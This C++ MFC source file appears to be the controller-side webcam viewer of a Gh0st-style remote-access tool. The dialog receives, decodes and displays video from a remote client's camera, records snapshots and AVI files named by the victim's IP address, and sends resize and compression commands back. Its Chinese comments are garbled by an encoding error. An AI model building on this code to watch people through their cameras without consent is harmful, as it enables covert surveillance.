// WebCamDlg.cpp : implementation file
//

#include "stdafx.h"
#include "TSPClientPublic.h"
#include "TSPClient.h"
#include "WebCamDlg.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

enum
{
	IDM_ENABLECOMPRESS = 0x0010,	// ��Ƶѹ��
	IDM_SAVEDIB,					// �������
	IDM_SAVEAVI,					// ����¼��
	IDM_SIZE_176_144,				// ��Ƶ�ֱ���, H263ֻ֧��������
	IDM_SIZE_352_288,
	IDM_REVERSE,					//��ת
};

/////////////////////////////////////////////////////////////////////////////
// CWebCamDlg dialog

CWebCamDlg::CWebCamDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CWebCamDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CWebCamDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_WEBCAM));
	m_nCount		= 0;
	m_lpbmi			= NULL;
	m_lpScreenDIB	= NULL;
	m_lpCompressDIB	= NULL;
	m_pVideoCodec	= NULL;

	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
	
	m_nOldWidth = 0;
	m_nCount = 0;

	ResetScreen(0, 0);
	m_bReverse = FALSE;
	m_pReverseBuf = new BYTE[704*5765*32]; //һ֡��󻺳�
	m_bClose = FALSE;
}


void CWebCamDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CWebCamDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CWebCamDlg, CDialog)
	//{{AFX_MSG_MAP(CWebCamDlg)
	ON_WM_CLOSE()
	ON_WM_PAINT()
	ON_WM_SYSCOMMAND()
	ON_WM_SHOWWINDOW()
	ON_WM_SIZE()
	ON_MESSAGE(WM_GETMINMAXINFO, OnGetMiniMaxInfo)
	ON_MESSAGE(WM_DRAWDIB, DrawDIB)
	ON_MESSAGE(WM_RESET_SCREEN, ResetScreen)
	ON_MESSAGE(WM_EXCEPTION, SendException)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CWebCamDlg message handlers

void CWebCamDlg::OnReceive()
{
	CString str;
	str.Format("\\\\%s %d * %d ��%d֡ %d%%", m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight,
		m_nCount, m_pContext->m_nTransferProgress);
	SetWindowText(str);	
}

void CWebCamDlg::OnReceiveComplete()
{
	m_nCount++;
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_WEBCAM_DIB:

		SendMessage(WM_DRAWDIB, 0, 0);
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // ��Ƶ��С�����ɹ�
		SendMessage(WM_RESET_SCREEN, 0, 0);
		break;
	default:
		// ���䷢���쳣����
		SendMessage(WM_EXCEPTION, 0, 0);
		break;
	}
}

BOOL CWebCamDlg::SaveSnapshot()
{
	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format("_%Y-%m-%d_%H-%M-%S.bmp");
	CFileDialog dlg(FALSE, "bmp", strFileName, OFN_OVERWRITEPROMPT, "λͼ�ļ�(*.bmp)|*.bmp|", this);
	if(dlg.DoModal () != IDOK)
		return FALSE;

	BITMAPFILEHEADER	hdr;
	LPBITMAPINFO		lpbi = m_lpbmi;
	CFile	file;
	if (!file.Open( dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
	{
		MessageBox("�ļ�����ʧ��");
		return FALSE;
	}
	
	// BITMAPINFO��С
	int	nbmiSize = sizeof(BITMAPINFOHEADER) + (lpbi->bmiHeader.biBitCount > 16 ? 1 : (1 << lpbi->bmiHeader.biBitCount)) * sizeof(RGBQUAD);
	
	// Fill in the fields of the file header
	hdr.bfType			= ((WORD) ('M' << 8) | 'B');	// is always "BM"
	hdr.bfSize			= lpbi->bmiHeader.biSizeImage + sizeof(hdr);
	hdr.bfReserved1 	= 0;
	hdr.bfReserved2 	= 0;
	hdr.bfOffBits		= sizeof(hdr) + nbmiSize;
	// Write the file header
	file.Write(&hdr, sizeof(hdr));
	file.Write(lpbi, nbmiSize);
	// Write the DIB header and the bits
	file.Write(m_lpScreenDIB, lpbi->bmiHeader.biSizeImage);
	file.Close();
	
	return TRUE;
}



void CWebCamDlg::SaveAvi()
{
	CMenu	*pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu->GetMenuState(IDM_SAVEAVI, MF_BYCOMMAND) & MF_CHECKED)
	{
		pSysMenu->CheckMenuItem(IDM_SAVEAVI, MF_UNCHECKED);
		m_aviFile = "";
		m_aviStream.Close();
		return;
	}

	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format("_%Y-%m-%d_%H-%M-%S.avi");
	CFileDialog dlg(FALSE, "avi", strFileName, OFN_OVERWRITEPROMPT, "��Ƶ�ļ�(*.avi)|*.avi|", this);
	if(dlg.DoModal () != IDOK)
		return;
	m_aviFile = dlg.GetPathName();
	if (!m_aviStream.Open(m_aviFile, m_lpbmi))
	{
		m_aviFile = "";
		MessageBox("����¼���ļ�ʧ��");	
	}
	else
	{
		pSysMenu->CheckMenuItem(IDM_SAVEAVI, MF_CHECKED);
	}

}
LRESULT CWebCamDlg::SendException(WPARAM wParam, LPARAM lparam)
{
	BYTE	bBuff = COMMAND_EXCEPTION;
	m_iocpServer->Send(m_pContext, &bBuff, 1);

	return 0;
}

BOOL CWebCamDlg::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE))
	{
		return TRUE;
	}
	return CDialog::PreTranslateMessage(pMsg);
}

LRESULT	CWebCamDlg::OnGetMiniMaxInfo(WPARAM wParam, LPARAM lparam)
{	
	// ���m_MMI�Ѿ�����ֵ
	if (m_MMI.ptMaxSize.x > 0)
		memcpy((void *)lparam, &m_MMI, sizeof(MINMAXINFO));
	
	return NULL;
}

void CWebCamDlg::InitMMI()
{
	RECT	rectClient, rectWindow;
	GetWindowRect(&rectWindow);
	GetClientRect(&rectClient);
	ClientToScreen(&rectClient);
	// �߿�Ŀ��
	int	nBorderWidth = rectClient.left - rectWindow.left;
	
	rectWindow.right = rectClient.left + nBorderWidth + m_lpbmi->bmiHeader.biWidth;
	rectWindow.bottom = rectClient.top + nBorderWidth + m_lpbmi->bmiHeader.biHeight;

	// �������ڵ�Զ�̴�С
 	MoveWindow(&rectWindow);

	int	nTitleWidth = rectClient.top - rectWindow.top; // �������ĸ߶�
	int	nWidthAdd = nBorderWidth * 2;
	int	nHeightAdd = nTitleWidth + nBorderWidth;

	int	nMaxWidth = GetSystemMetrics(SM_CXSCREEN);
	int	nMaxHeight = GetSystemMetrics(SM_CYSCREEN);
	// ��С��Track�ߴ�
	m_MMI.ptMinTrackSize.x = m_lpbmi->bmiHeader.biWidth + nWidthAdd;
	m_MMI.ptMinTrackSize.y = m_lpbmi->bmiHeader.biHeight + nHeightAdd;


	// ���ʱ���ڵ�λ��
	m_MMI.ptMaxPosition.x = 1;
	m_MMI.ptMaxPosition.y = 1;
	// �������ߴ�
	m_MMI.ptMaxSize.x = nMaxWidth;
	m_MMI.ptMaxSize.y = nMaxHeight;
	
	// ����Track�ߴ�ҲҪ�ı�
	m_MMI.ptMaxTrackSize.x = nMaxWidth;
	m_MMI.ptMaxTrackSize.y = nMaxHeight;

}

void CWebCamDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	// ����ʱ�Ƴ��Լ�����ͼ�е�����

	// �������¼��ֹͣ

	m_bClose = TRUE;

// 	MSG msg;
// 	while(PeekMessage(&msg,NULL,NULL,NULL,PM_REMOVE));

	if (!m_aviFile.IsEmpty())
		SaveAvi();


	::ReleaseDC(m_hWnd, m_hDC);
	DrawDibClose(m_hDD);

	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	
	if (m_lpbmi) 
		delete [] m_lpbmi;
	if (m_lpScreenDIB)
		delete [] m_lpScreenDIB;
	if (m_lpCompressDIB)
		delete [] m_lpCompressDIB;
	if (m_pVideoCodec)
		delete m_pVideoCodec;

	if (NULL != m_pReverseBuf)
	{
		delete[] m_pReverseBuf;
		m_pReverseBuf = NULL;
	}

	CDialog::OnClose();
}

BOOL CWebCamDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		pSysMenu->AppendMenu(MF_STRING, IDM_ENABLECOMPRESS, "��Ƶѹ��(&C)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, "�������(&S)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI, "����¼��(&V)");
		pSysMenu->AppendMenu(MF_STRING, IDM_REVERSE, "��ת(&R)");
		pSysMenu->AppendMenu(MF_SEPARATOR);	
		pSysMenu->AppendMenu(MF_STRING, IDM_SIZE_176_144, "176 * 144");
		pSysMenu->AppendMenu(MF_STRING, IDM_SIZE_352_288, "352 * 288");
		

		// ��֧�̶ֹ��Ĵ�С��˵��Զ����Ƶ�й̶��Ĵ�С����������ʧЧ 
		if ((m_lpbmi->bmiHeader.biWidth != 352 && m_lpbmi->bmiHeader.biWidth != 288)
			&& (m_lpbmi->bmiHeader.biWidth != 176 && m_lpbmi->bmiHeader.biWidth != 144))
		{
			pSysMenu->EnableMenuItem(IDM_SIZE_176_144, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
			pSysMenu->EnableMenuItem(IDM_SIZE_352_288, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		}
		else
			pSysMenu->CheckMenuRadioItem(IDM_SIZE_176_144, IDM_SIZE_352_288, IDM_SIZE_352_288, MF_BYCOMMAND);

	}

	CString str;
	str.Format("\\\\%s %d * %d", m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight);
	SetWindowText(str);
	// ��ʼ�����ڴ�С�ṹ
	InitMMI();

	m_hDD = DrawDibOpen();
	m_hDC = ::GetDC(m_hWnd);

	// ֪ͨԶ�̿��ƶ˶Ի����Ѿ���
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CWebCamDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	switch (nID)
	{
	case IDM_ENABLECOMPRESS:
		{
			BOOL bIsChecked = pSysMenu->GetMenuState(IDM_ENABLECOMPRESS, MF_BYCOMMAND) & MF_CHECKED;
			pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
			bIsChecked = !bIsChecked;
			BYTE	bToken = COMMAND_WEBCAM_ENABLECOMPRESS;
			if (!bIsChecked)
				bToken = COMMAND_WEBCAM_DISABLECOMPRESS;
			m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
		}
		break;
	case IDM_SAVEDIB:
		SaveSnapshot();
		break;
	case IDM_SAVEAVI:
		SaveAvi();
		break;
	case IDM_REVERSE:
		m_bReverse = !m_bReverse;
		break;
	case IDM_SIZE_176_144:
		{
			if (SendResetScreen(176, 144))
				pSysMenu->CheckMenuRadioItem(IDM_SIZE_176_144, IDM_SIZE_352_288, IDM_SIZE_176_144, MF_BYCOMMAND);
		}
		break;
	case IDM_SIZE_352_288:
		{
			if (SendResetScreen(352, 288))
				pSysMenu->CheckMenuRadioItem(IDM_SIZE_176_144, IDM_SIZE_352_288, IDM_SIZE_352_288, MF_BYCOMMAND);
		}
		break;
	default:
		CDialog::OnSysCommand(nID, lParam);
	}
}

void CWebCamDlg::SendNext()
{
	BYTE	bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

LRESULT CWebCamDlg::DrawDIB(WPARAM wParam, LPARAM lparam)
{
	if (m_bClose)
	{
		return 0;
	}

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu == NULL)
		return 0;
	// token + IsCompress + m_fccHandler + DIB
	int		nHeadLen = 1 + 1 + 4;

	LPBYTE	lpBuffer = m_pContext->m_DeCompressionBuffer.GetBuffer();
	UINT	nBufferLen = m_pContext->m_DeCompressionBuffer.GetBufferLen();
	if (lpBuffer[1] == 0) // û�о���H263ѹ����ԭʼ���ݣ�����Ҫ����
	{
		// ��һ�Σ�û��ѹ����˵������˲�֧��ָ���Ľ�����
		if (m_nCount == 1)
		{
			pSysMenu->EnableMenuItem(IDM_ENABLECOMPRESS, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		}
		pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, MF_UNCHECKED);
		memcpy(m_lpScreenDIB, lpBuffer + nHeadLen, nBufferLen - nHeadLen);
	}
	else // ����
	{
		InitCodec(*(LPDWORD)(lpBuffer + 2));
		if (m_pVideoCodec != NULL)
		{
			pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, MF_CHECKED);
			memcpy(m_lpCompressDIB, lpBuffer + nHeadLen, nBufferLen - nHeadLen);
			m_pVideoCodec->DecodeVideoData(m_lpCompressDIB, nBufferLen - nHeadLen, 
				(LPBYTE)m_lpScreenDIB, NULL,  NULL);
		}
	}
	OnPaint();

	return 0;
}

void CWebCamDlg::InitCodec(DWORD fccHandler)
{
	if (m_pVideoCodec != NULL)
		return;

	m_pVideoCodec = new CVideoCodec;
	if (!m_pVideoCodec->InitCompressor(m_lpbmi, fccHandler))
	{
		delete m_pVideoCodec;
		// ��NULL, ����ʱ�ж��Ƿ�ΪNULL���ж��Ƿ�ѹ��
		m_pVideoCodec = NULL;
		// ֪ͨ����˲�����ѹ��
		BYTE bToken = COMMAND_WEBCAM_DISABLECOMPRESS;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
		GetSystemMenu(FALSE)->EnableMenuItem(IDM_ENABLECOMPRESS, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
	}	
}

BOOL CWebCamDlg::SendResetScreen(int nWidth, int nHeight)
{
	if (GetSystemMenu(FALSE)->GetMenuState(IDM_SAVEAVI, MF_BYCOMMAND) & MF_CHECKED)
	{
		MessageBox("����¼���У����ܵ�����Ƶ��С");
		return FALSE;
	}
	BYTE	bPacket[9];
	bPacket[0] = COMMAND_WEBCAM_RESIZE;
	*((LPDWORD)&bPacket[1]) = nWidth;
	*((LPDWORD)&bPacket[5]) = nHeight;
	m_iocpServer->Send(m_pContext, bPacket, sizeof(bPacket));

	return TRUE;
}

LRESULT  CWebCamDlg::ResetScreen(WPARAM wParam, LPARAM lparam)
{
	if (m_lpbmi)
	{
		delete m_lpbmi;
		m_lpbmi = NULL;
	}
	if (m_lpScreenDIB)
	{
		delete m_lpScreenDIB;
		m_lpScreenDIB = NULL;
	}
	if (m_lpCompressDIB)
	{
		delete m_lpCompressDIB;
		m_lpCompressDIB = NULL;
	}

	if (m_pVideoCodec)
	{
		delete m_pVideoCodec;
		m_pVideoCodec = NULL;
	}

	int	nBmiSize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	m_lpbmi	= (LPBITMAPINFO) new BYTE[nBmiSize];
	memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBmiSize);

	m_lpScreenDIB	= new BYTE[m_lpbmi->bmiHeader.biSizeImage];
	m_lpCompressDIB	= new BYTE[m_lpbmi->bmiHeader.biSizeImage];
	
	memset(&m_MMI, 0, sizeof(MINMAXINFO));
	if (IsWindowVisible())
		InitMMI();

	return 0;
}

void CWebCamDlg::OnPaint() 
{
	// TODO: Add your message handler code here
	CPaintDC dc(this); // device context for painting
	RECT rect;
	GetClientRect(&rect);

	BYTE *pBuffDes = (BYTE *)m_lpScreenDIB;

	if (m_bReverse)
	{
		int nWidth = m_lpbmi->bmiHeader.biWidth * m_lpbmi->bmiHeader.biBitCount/8;
		for (int i=0; i<m_lpbmi->bmiHeader.biHeight; i++)
		{
			memcpy(m_pReverseBuf + i * nWidth, 	m_lpScreenDIB + (m_lpbmi->bmiHeader.biHeight - i) * nWidth, nWidth);
		}

		pBuffDes = m_pReverseBuf;
	}

//	StretchDIBits�����ã���Щʱ��ử������
	/*
	StretchDIBits
		(
		m_hDC,
		0, 0, rect.right, rect.bottom, 
		0, 0, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, 
		(LPBYTE)m_lpScreenDIB, 
		m_lpbmi, 
		DIB_RGB_COLORS, 
		SRCCOPY
		);
	*/
	DrawDibDraw
		(
		m_hDD, 
		m_hDC,
		0, 0,
		rect.right, rect.bottom,
		(LPBITMAPINFOHEADER)m_lpbmi,
		pBuffDes,
		0, 0,
		m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, 
		DDF_SAME_HDC
		);

	LPCTSTR	lpTipsString = "Recording ...";
	// д��¼���ļ�
	if (!m_aviFile.IsEmpty())
	{
		m_aviStream.Write(m_lpScreenDIB);
		// ��ʾ����¼��
		SetBkMode(m_hDC, TRANSPARENT);
		SetTextColor(m_hDC, RGB(0xff,0x00,0x00));
		TextOut(m_hDC, 0, 0, lpTipsString, lstrlen(lpTipsString));
	}

	// Do not call CDialog::OnPaint() for painting messages
}

void CWebCamDlg::OnShowWindow(BOOL bShow, UINT nStatus) 
{
	CDialog::OnShowWindow(bShow, nStatus);
	
	// TODO: Add your message handler code here
	
}

void CWebCamDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);
	if (!IsWindowVisible())
		return;

	// �������������ڴ�С
	int	x = m_lpbmi->bmiHeader.biWidth, y = m_lpbmi->bmiHeader.biHeight; // x:y

	RECT	rectClientToScreen, rectClient, rectWindow;
	GetWindowRect(&rectWindow);
	GetClientRect(&rectClient);
	GetClientRect(&rectClientToScreen);
	ClientToScreen(&rectClientToScreen);  
	// �߿�Ŀ��
	int	nBorderWidth = rectClientToScreen.left - rectWindow.left;

	int	nWindowWidth = rectWindow.right - rectWindow.left;
	int	nWindowHeight = rectWindow.bottom - rectWindow.top;
	
	// �����仯
	if (m_nOldWidth != nWindowWidth)
		rectWindow.bottom = rectClientToScreen.top + nBorderWidth + (rectClient.right * y) / x;
	else
		rectWindow.right = rectClientToScreen.left + nBorderWidth + (rectClient.bottom * x) / y;
	   
	m_nOldWidth = nWindowWidth;

	MoveWindow(&rectWindow);
	
	OnPaint();
	// TODO: Add your message handler code here
	
}

void CWebCamDlg::PostNcDestroy() 
{
	// TODO: Add your specialized code here and/or call the base class
// 	delete this;
	CDialog::PostNcDestroy();
}


DWORD WINAPI CWebCamDlg::CreateWebDlg(LPVOID lparam)
{
	if (NULL == lparam)
	{
		return 0;
	}

	PWEBDLGINFO pInfoWeb = PWEBDLGINFO(lparam);
	CWebCamDlg dlg (NULL, pInfoWeb->lpIocpServer, pInfoWeb->lpContext);

	pInfoWeb->lpContext->m_Dialog[0] = WEBCAM_DLG;
	pInfoWeb->lpContext->m_Dialog[1] = (int)(&dlg);

	::SetEvent(pInfoWeb->hEvent);

	
	dlg.DoModal();
	::CloseHandle(pInfoWeb->hEvent);
	delete(pInfoWeb);

	return 0;
}